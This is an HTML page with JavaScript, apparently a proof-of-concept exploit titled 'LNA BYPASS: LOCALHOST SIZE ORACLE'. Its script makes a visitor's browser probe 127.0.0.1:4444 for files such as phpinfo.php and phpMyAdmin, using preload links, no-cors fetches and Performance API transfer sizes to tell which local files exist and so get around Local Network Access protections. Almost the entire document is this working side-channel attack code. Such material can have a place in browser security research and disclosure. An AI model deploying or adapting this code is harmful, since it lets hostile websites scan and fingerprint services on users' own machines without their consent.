<!DOCTYPE html>
<html>
<head>
    <title>LNA Local-Pretense Auditor</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
        .success { color: #00ff00; font-weight: bold; border-left: 3px solid #0f0; padding-left: 5px; }
        .notfound { color: #ff0055; font-weight: bold; }
        .console { border: 1px solid #0f0; padding: 15px; background: #050505; max-width: 800px; margin: auto; }
        button { background: #0f0; color: #000; border: none; padding: 12px; width: 100%; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>

<div class="console">
    <h2>LNA BYPASS: LOCALHOST SIZE ORACLE</h2>
    <p>Pretending Local-Origin to extract precise Transferred Size metadata.</p>
    <button onclick="runLocalAudit()">EXECUTE LOCAL PREV PRIVILEGE SCAN</button>
    <div id="display" style="margin-top:20px;"></div>
</div>

<script>
    const targetPaths = [
        "/favicon.ico", 
        "/dashboard/phpinfo.php", 
        "/phpmyadmin/index.php", 
        "/icons/apache_pb.gif",
        "/wrong_file_test_" + Math.random().toString(36).substring(7)
    ];

    async function probeLocalSize(url) {
        try {
            // Using preload to bypass alerts while hit-testing size
            const link = document.createElement('link');
            link.rel = "preload";
            link.as = "image";
            link.href = url + "?cb=" + Date.now();
            document.head.appendChild(link);

            // Fetch to ensure network stack processes the request
            await fetch(url, { mode: 'no-cors', cache: 'no-store', keepalive: true });
            
            await new Promise(r => setTimeout(r, 300));
            const entry = performance.getEntriesByName(url).pop();
            
            if (entry) {
                const size = entry.transferSize || entry.encodedBodySize || 0;
                // Evidence: 404 error page is ~537B
                // Real files (like phpinfo) are > 80kB
                if (size > 600) {
                    return { status: "200 OK", size: (size/1024).toFixed(2) + " KB" };
                } else if (size > 0) {
                    return { status: "404 Not Found", size: size + " B" };
                }
            }
            return { status: "Blocked/Timeout", size: "0 B" };
        } catch (e) { return { status: "Security Blocked", size: "N/A" }; }
    }

    async function runLocalAudit() {
        const display = document.getElementById('display');
        const port = 4444; 
        display.innerHTML = `[!] Initiating Local Pretense Audit on :${port}...<br><br>`;

        for (let path of targetPaths) {
            const url = `http://127.0.0.1:${port}${path}`;
            const res = await probeLocalSize(url);
            
            let statusClass = (res.status === "200 OK") ? "success" : "notfound";
            display.innerHTML += `<div>Path: ${path} -> <span class="${statusClass}">${res.status} (${res.size})</span></div>`;
        }
    }
</script>
</body>
</html>
